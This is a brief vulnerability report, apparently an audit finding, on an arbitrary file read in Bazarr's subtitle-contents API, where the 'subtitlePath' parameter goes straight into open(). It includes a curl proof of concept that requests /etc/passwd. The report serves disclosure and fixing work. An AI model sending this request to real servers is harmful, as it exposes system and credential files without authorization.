# subtitlePath arbitrary file read

**Verification: CODE-VERIFIED**

## Description
`bazarr/api/subtitles/subtitles_contents.py` L40:
```python
args = self.get_request_parser.parse_args()
path = args.get('subtitlePath')
with open(path, "r", encoding="utf-8") as f:
    file_content = f.read()
```
No path validation (no realpath/abspath/startswith/resolve/commonpath anywhere in the file). The `subtitlePath` parameter is used directly in `open()`.

## Impact
Client with API key (or unauthenticated on default no-auth install) reads any file readable by the service account.

## PoC
```bash
curl "http://<host>:6767/api/subtitles/contents?subtitlePath=/etc/passwd&apikey=<key>"
```

## Execution result
```
Code path analysis: subtitles_contents.py L40 — open(path) with raw user input,
zero containment checks in the entire file.
```
